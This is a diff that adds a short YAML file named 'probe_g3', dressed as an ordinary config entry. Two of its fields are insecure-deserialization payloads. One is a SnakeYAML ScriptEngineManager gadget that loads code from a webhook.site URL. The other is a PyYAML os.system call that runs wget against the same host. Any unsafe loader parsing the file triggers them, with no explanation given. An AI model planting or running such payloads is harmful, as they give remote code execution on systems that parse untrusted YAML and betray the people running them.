@@ -1,0 +1,5 @@
+name: probe_g3
+description: g3
+kind: Boolean
+a: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g3-java"]]
+b: !!python/object/apply:os.system ["wget -q -O- http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g3-py"]
